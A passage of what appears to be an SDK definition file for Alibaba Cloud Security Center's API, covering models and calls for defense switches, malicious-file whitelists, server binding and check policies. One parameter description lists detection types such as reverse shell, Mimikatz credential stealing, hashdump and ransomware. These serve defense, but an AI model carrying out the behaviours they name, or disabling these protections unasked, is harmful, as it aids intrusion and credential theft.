    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes whitelist rules for alerts generated for sensitive files that are detected by using the agentless detection feature in batches.
 *
 * @param request BatchDeleteMaliciousFileWhitelistConfigRequest
 * @return BatchDeleteMaliciousFileWhitelistConfigResponse
 */
async function batchDeleteMaliciousFileWhitelistConfig(request: BatchDeleteMaliciousFileWhitelistConfigRequest): BatchDeleteMaliciousFileWhitelistConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return batchDeleteMaliciousFileWhitelistConfigWithOptions(request, runtime);
}

model BatchOperateCommonOverallConfigRequest {
  config?: string(name='Config', description='The status of the feature. Valid values:

*   **on**: enabled
*   **off**: disabled

This parameter is required.', example='on'),
  typeList?: [ string ](name='TypeList', description='The type of the feature in proactive defense. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE_64025**: Ingress service execute command [enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE_54383**: MimiKatz Credential Stealing (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE_50870**: Rebound Shell (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE_52829**: delete system backup behavior (Windows)

This parameter is required.'),
}

model BatchOperateCommonOverallConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='765EDBDE-1686-5DBA-B76F-2E0E6E7E1B96'),
}

model BatchOperateCommonOverallConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: BatchOperateCommonOverallConfigResponseBody(name='body'),
}

/**
 * @summary Enables or disables multiple features in proactive defense at a time.
 *
 * @param request BatchOperateCommonOverallConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return BatchOperateCommonOverallConfigResponse
 */
async function batchOperateCommonOverallConfigWithOptions(request: BatchOperateCommonOverallConfigRequest, runtime: Util.RuntimeOptions): BatchOperateCommonOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.typeList)) {
    query['TypeList'] = request.typeList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BatchOperateCommonOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables multiple features in proactive defense at a time.
 *
 * @param request BatchOperateCommonOverallConfigRequest
 * @return BatchOperateCommonOverallConfigResponse
 */
async function batchOperateCommonOverallConfig(request: BatchOperateCommonOverallConfigRequest): BatchOperateCommonOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return batchOperateCommonOverallConfigWithOptions(request, runtime);
}

model BatchUpdateMaliciousFileWhitelistConfigRequest {
  configList?: [ 
    {
      configId?: long(name='ConfigId', description='The ID of the whitelist rule. If you do not specify this parameter, a whitelist rule is created.', example='1'),
      eventName?: string(name='EventName', description='The name of the alert.

*   Set the value to **ALL**, which indicates all alert types.', example='ALL'),
      field?: string(name='Field', description='The field that you want to use in the whitelist rule.', example='fileMd5'),
      fieldValue?: string(name='FieldValue', description='The value of the field that you want to use in the whitelist rule.', example='b2cf9747ee49d8d9b105cf16e078cc16'),
      operator?: string(name='Operator', description='The logical operator that you want to use in the whitelist rule.

*   Set the value to strEqual, which indicates the equality operator (=).', example='strEqual'),
      source?: string(name='Source', description='The feature to which this operation belongs.

*   Set the value to agentless, which indicates the agentless detection feature.', example='agentless'),
      targetType?: string(name='TargetType', description='The type of the assets on which you want the whitelist rule to take effect. Valid values:

*   ALL: all assets
*   SELECTION_KEY: selected assets', example='ALL'),
      targetValue?: string(name='TargetValue', description='The assets on which you want the whitelist rule to take effect. Valid values:

*   ALL: all assets
*   Others: selected assets', example='ALL'),
    }
  ](name='ConfigList', description='The whitelist rules.'),
}

model BatchUpdateMaliciousFileWhitelistConfigResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='7532B7EE-7CE7-5F4D-BF04-B12447DDCAE1'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model BatchUpdateMaliciousFileWhitelistConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: BatchUpdateMaliciousFileWhitelistConfigResponseBody(name='body'),
}

/**
 * @summary Modifies multiple alert whitelist rules of sensitive files that are detected by using the agentless detection feature at a time.
 *
 * @param request BatchUpdateMaliciousFileWhitelistConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return BatchUpdateMaliciousFileWhitelistConfigResponse
 */
async function batchUpdateMaliciousFileWhitelistConfigWithOptions(request: BatchUpdateMaliciousFileWhitelistConfigRequest, runtime: Util.RuntimeOptions): BatchUpdateMaliciousFileWhitelistConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configList)) {
    query['ConfigList'] = request.configList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BatchUpdateMaliciousFileWhitelistConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies multiple alert whitelist rules of sensitive files that are detected by using the agentless detection feature at a time.
 *
 * @param request BatchUpdateMaliciousFileWhitelistConfigRequest
 * @return BatchUpdateMaliciousFileWhitelistConfigResponse
 */
async function batchUpdateMaliciousFileWhitelistConfig(request: BatchUpdateMaliciousFileWhitelistConfigRequest): BatchUpdateMaliciousFileWhitelistConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return batchUpdateMaliciousFileWhitelistConfigWithOptions(request, runtime);
}

model BindAuthToMachineRequest {
  authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to scan the asset. Valid values:

*   **6**: Anti-virus
*   **5**: Advanced
*   **3**: Enterprise
*   **7**: Ultimate
*   **10**: Value-added Plan', example='6'),
  autoBind?: int32(name='AutoBind', description='Specifies whether to automatically bind servers to Security Center. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  bind?: [ string ](name='Bind', description='The UUIDs of the servers that you want to bind to Security Center.

>  You must specify at least one of the **Bind** and **UnBind** parameters.'),
  bindAll?: boolean(name='BindAll', description='Specifies whether to bind all servers to Security Center. Default value: **false**. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  criteria?: string(name='Criteria', description='The search conditions that are used to filter servers. The value of this parameter is in the JSON format and is case-sensitive.

>  A search condition can be an instance ID, instance name, virtual private cloud (VPC) ID, region, or public IP address. You can call the [DescribeCriteria](~~DescribeCriteria~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]'),
  isPreBind?: int32(name='IsPreBind', description='Specifies whether to specify servers for protection when you purchase Security Center. Valid values:

*   **0**: no
*   **1**: yes

>  If you specify servers, the servers are automatically added to Security Center for protection after the purchase order is complete.', example='1'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Default value: **OR**. Valid values:

*   **OR******
*   **AND******', example='OR'),
  ntmVersion?: string(name='NtmVersion', description='The edition of Security Center that you purchase in the order. Valid values:

*   **level7**: Anti-virus
*   **level3**: Advanced
*   **level2**: Enterprise
*   **level8**: Ultimate
*   **level10**: Value-added Plan', example='level2'),
  preBindOrderId?: long(name='PreBindOrderId', description='The ID of the order in which Security Center is purchased and servers are specified for protection.', example='233016**0482'),
  unBind?: [ string ](name='UnBind', description='The UUIDs of the servers that you want to unbind from Security Center.

>  You must specify at least one of the **Bind** and **UnBind** parameters.'),
}

model BindAuthToMachineResponseBody = {
  bindCount?: int32(name='BindCount', description='The number of bound servers.', example='1'),
  insufficientCoreCount?: int32(name='InsufficientCoreCount', description='The shortage in the quota for cores of servers that can be protected.', example='1'),
  insufficientEcsCount?: int32(name='InsufficientEcsCount', description='The shortage in the quota for servers that can be protected.', example='1'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='23AD0BD2-8771-5647-819E-6BA51E212F80'),
  resultCode?: int32(name='ResultCode', description='The status code that indicates the result. Valid values:

*   **0**: The servers are bound to or unbound from Security Center.
*   **1**: The values that you specified for the parameters are invalid.
*   **2**: The quota for servers that can be protected is insufficient.
*   **3**: The quota for cores of servers that can be protected is insufficient.', example='2'),
  unBindCount?: int32(name='UnBindCount', description='The number of unbound servers.', example='1'),
}

model BindAuthToMachineResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: BindAuthToMachineResponseBody(name='body'),
}

/**
 * @summary Binds servers to Security Center or unbinds servers from Security Center.
 *
 * @param request BindAuthToMachineRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return BindAuthToMachineResponse
 */
async function bindAuthToMachineWithOptions(request: BindAuthToMachineRequest, runtime: Util.RuntimeOptions): BindAuthToMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authVersion)) {
    query['AuthVersion'] = request.authVersion;
  }
  if (!Util.isUnset(request.autoBind)) {
    query['AutoBind'] = request.autoBind;
  }
  if (!Util.isUnset(request.bind)) {
    query['Bind'] = request.bind;
  }
  if (!Util.isUnset(request.bindAll)) {
    query['BindAll'] = request.bindAll;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.isPreBind)) {
    query['IsPreBind'] = request.isPreBind;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.ntmVersion)) {
    query['NtmVersion'] = request.ntmVersion;
  }
  if (!Util.isUnset(request.preBindOrderId)) {
    query['PreBindOrderId'] = request.preBindOrderId;
  }
  if (!Util.isUnset(request.unBind)) {
    query['UnBind'] = request.unBind;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BindAuthToMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Binds servers to Security Center or unbinds servers from Security Center.
 *
 * @param request BindAuthToMachineRequest
 * @return BindAuthToMachineResponse
 */
async function bindAuthToMachine(request: BindAuthToMachineRequest): BindAuthToMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return bindAuthToMachineWithOptions(request, runtime);
}

model BindHybridProxyRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster.

This parameter is required.', example='sas-proxy'),
  yundunUuids?: [ string ](name='YundunUuids', description='The UUIDs of servers that you want to add to Security Center over the proxy server.

This parameter is required.'),
}

model BindHybridProxyResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='11C96623-E106-59C9-866D-A6C82911459F'),
}

model BindHybridProxyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: BindHybridProxyResponseBody(name='body'),
}

/**
 * @summary Adds servers to Security Center over a proxy server. After you create a proxy cluster and deploy a proxy server, you can connect a server to the proxy cluster as a client. This way, the server is added to Security Center over the proxy server and is protected.
 *
 * @param request BindHybridProxyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return BindHybridProxyResponse
 */
async function bindHybridProxyWithOptions(request: BindHybridProxyRequest, runtime: Util.RuntimeOptions): BindHybridProxyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.yundunUuids)) {
    query['YundunUuids'] = request.yundunUuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'BindHybridProxy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds servers to Security Center over a proxy server. After you create a proxy cluster and deploy a proxy server, you can connect a server to the proxy cluster as a client. This way, the server is added to Security Center over the proxy server and is protected.
 *
 * @param request BindHybridProxyRequest
 * @return BindHybridProxyResponse
 */
async function bindHybridProxy(request: BindHybridProxyRequest): BindHybridProxyResponse {
  var runtime = new Util.RuntimeOptions{};
  return bindHybridProxyWithOptions(request, runtime);
}

model CancelOnceTaskRequest {
  taskId?: string(name='TaskId', description='The ID of the task.

>  You can call the [GenerateOnceTask](~~GenerateOnceTask~~) operation to query the IDs of tasks.

This parameter is required.', example='ec9c0d88f36cc27765a98c554ee2****'),
}

model CancelOnceTaskResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
}

model CancelOnceTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CancelOnceTaskResponseBody(name='body'),
}

/**
 * @summary Cancels the main task.
 *
 * @param request CancelOnceTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CancelOnceTaskResponse
 */
async function cancelOnceTaskWithOptions(request: CancelOnceTaskRequest, runtime: Util.RuntimeOptions): CancelOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CancelOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Cancels the main task.
 *
 * @param request CancelOnceTaskRequest
 * @return CancelOnceTaskResponse
 */
async function cancelOnceTask(request: CancelOnceTaskRequest): CancelOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return cancelOnceTaskWithOptions(request, runtime);
}

model ChangeAssetRefreshTaskConfigRequest {
  assetRefreshConfigs?: [ 
    {
      refreshConfigType?: int32(name='RefreshConfigType', description='The type of the configuration. Valid values:

*   **0**: server synchronization task
*   **1**: cloud service synchronization task
*   **2**: scheduled AccessKey pair verification task', example='2'),
      schedulePeriod?: int32(name='SchedulePeriod', description='The synchronization cycle. Valid values:

*   **60**: 60 minutes
*   **180**: 3 hours
*   **360**: 6 hours
*   **720**: 12 hours
*   **1440**: 1 day
*   **10080**: 7 days', example='360'),
      status?: int32(name='Status', description='The status of the configuration. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
      targetId?: long(name='TargetId', description='The ID of the data entry containing the AccessKey pair that you specify when you configure the scheduled AccessKey pair verification task.', example='2308'),
      vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **3**: Tencent Cloud
*   **4**: Huawei Cloud
*   **7**: Amazon Web Services (AWS) Cloud', example='3'),
    }
  ](name='AssetRefreshConfigs', description='The asset synchronization configuration.'),
  regionId?: string(name='RegionId', description='The region in which your Security Center service resides.', example='cn-hangzhou'),
}

model ChangeAssetRefreshTaskConfigResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model ChangeAssetRefreshTaskConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ChangeAssetRefreshTaskConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the interval of asset synchronization configurations.
 *
 * @param request ChangeAssetRefreshTaskConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ChangeAssetRefreshTaskConfigResponse
 */
async function changeAssetRefreshTaskConfigWithOptions(request: ChangeAssetRefreshTaskConfigRequest, runtime: Util.RuntimeOptions): ChangeAssetRefreshTaskConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetRefreshConfigs)) {
    query['AssetRefreshConfigs'] = request.assetRefreshConfigs;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ChangeAssetRefreshTaskConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the interval of asset synchronization configurations.
 *
 * @param request ChangeAssetRefreshTaskConfigRequest
 * @return ChangeAssetRefreshTaskConfigResponse
 */
async function changeAssetRefreshTaskConfig(request: ChangeAssetRefreshTaskConfigRequest): ChangeAssetRefreshTaskConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return changeAssetRefreshTaskConfigWithOptions(request, runtime);
}

model ChangeCheckConfigRequest {
  addedCheck?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the ID of the check item.', example='5'),
      sectionId?: long(name='SectionId', description='The section ID of the check item.', example='69'),
    }
  ](name='AddedCheck', description='The list of check items that you want to add to the policy.

>  If the ConfigStandardIds or ConfigRequirementIds parameter is configured, this parameter does not take effect.'),
  configRequirementIds?: {
    addIds?: [ long ](name='AddIds', description='The requirement IDs that you want to add to the policy.'),
    removeIds?: [ long ](name='RemoveIds', description='The requirement IDs that you want to remove from the policy.'),
  }(name='ConfigRequirementIds', description='The requirement IDs that you want to specify for the check policy.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the requirement ID. If the ConfigStandardIds parameter is configured, this parameter does not take effect.'),
  configStandardIds?: {
    addIds?: [ long ](name='AddIds', description='The standard IDs that you want to add to the policy.'),
    removeIds?: [ long ](name='RemoveIds', description='The standard IDs that you want to remove from the policy.'),
  }(name='ConfigStandardIds', description='The standard IDs that you want to specify for the check policy.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the standard ID.'),
  configure?: string(name='Configure', description='The configuration of the check item. Valid value:

*   **all**: Add all check items.', example='all'),
  cycleDays?: [ int32 ](name='CycleDays', description='The days in a week on which a check is performed.'),
  enableAddCheck?: boolean(name='EnableAddCheck', description='Specifies whether to check the new check items in the selected requirement item. Valid values:
- **true**
- **false**', example='false'),
  enableAutoCheck?: boolean(name='EnableAutoCheck', description='Specifies whether to enable the automatic periodical check feature. Valid values:

- **true**
- **false**', example='true'),
  endTime?: int32(name='EndTime', description='The end time of the check. The value specifies a point in time in a day. The time period that is specified by the start time and end time must be one of the following time periods:

*   **00:00 to 06:00:** If you set the StartTime parameter to 0, you must set the EndTime parameter to 6.
*   **06:00 to 12:00**: If you set the StartTime parameter to 6, you must set the EndTime parameter to 12.
*   **12:00 to 18:00**: If you set the StartTime parameter to 12, you must set the EndTime parameter to 18.
*  **18:00 to 24:00:** If you set the StartTime parameter to 18, you must set the EndTime parameter to 24.', example='6'),
  regionId?: string(name='RegionId', description='The region ID of the bastion host to query.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](https://help.aliyun.com/document_detail/40654.html).', example='cn-hangzhou'),
  removedCheck?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the ID of the check item.', example='19'),
      sectionId?: long(name='SectionId', description='The section ID of the check item.', example='69'),
    }
  ](name='RemovedCheck', description='The list of the check items that you want to remove from the policy.

>  If the ConfigStandardIds or ConfigRequirementIds parameter is configured, this parameter does not take effect.'),
  standardIds?: [ long ](name='StandardIds', description='An array that consists of the information about the check item.'),
  startTime?: int32(name='StartTime', description='The start time of the check. The value specifies a point in time in a day.', example='0'),
  systemConfig?: boolean(name='SystemConfig', description='Specifies whether to use the configuration automatically generated by the system. Valid values:

*   **true**
*   **false**', example='true'),
  vendors?: [ string ](name='Vendors', description='The cloud service providers.'),
}

model ChangeCheckConfigShrinkRequest {
  addedCheck?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the ID of the check item.', example='5'),
      sectionId?: long(name='SectionId', description='The section ID of the check item.', example='69'),
    }
  ](name='AddedCheck', description='The list of check items that you want to add to the policy.

>  If the ConfigStandardIds or ConfigRequirementIds parameter is configured, this parameter does not take effect.'),
  configRequirementIdsShrink?: string(name='ConfigRequirementIds', description='The requirement IDs that you want to specify for the check policy.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the requirement ID. If the ConfigStandardIds parameter is configured, this parameter does not take effect.'),
  configStandardIdsShrink?: string(name='ConfigStandardIds', description='The standard IDs that you want to specify for the check policy.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the standard ID.'),
  configure?: string(name='Configure', description='The configuration of the check item. Valid value:

*   **all**: Add all check items.', example='all'),
  cycleDays?: [ int32 ](name='CycleDays', description='The days in a week on which a check is performed.'),
  enableAddCheck?: boolean(name='EnableAddCheck', description='Specifies whether to check the new check items in the selected requirement item. Valid values:
- **true**
- **false**', example='false'),
  enableAutoCheck?: boolean(name='EnableAutoCheck', description='Specifies whether to enable the automatic periodical check feature. Valid values:

- **true**
- **false**', example='true'),
  endTime?: int32(name='EndTime', description='The end time of the check. The value specifies a point in time in a day. The time period that is specified by the start time and end time must be one of the following time periods:

*   **00:00 to 06:00:** If you set the StartTime parameter to 0, you must set the EndTime parameter to 6.
*   **06:00 to 12:00**: If you set the StartTime parameter to 6, you must set the EndTime parameter to 12.
*   **12:00 to 18:00**: If you set the StartTime parameter to 12, you must set the EndTime parameter to 18.
*  **18:00 to 24:00:** If you set the StartTime parameter to 18, you must set the EndTime parameter to 24.', example='6'),
  regionId?: string(name='RegionId', description='The region ID of the bastion host to query.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](https://help.aliyun.com/document_detail/40654.html).', example='cn-hangzhou'),
  removedCheck?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.

>  You can call the [ListCheckResult](~~ListCheckResult~~) operation to obtain the ID of the check item.', example='19'),
      sectionId?: long(name='SectionId', description='The section ID of the check item.', example='69'),
    }
  ](name='RemovedCheck', description='The list of the check items that you want to remove from the policy.

>  If the ConfigStandardIds or ConfigRequirementIds parameter is configured, this parameter does not take effect.'),
  standardIds?: [ long ](name='StandardIds', description='An array that consists of the information about the check item.'),
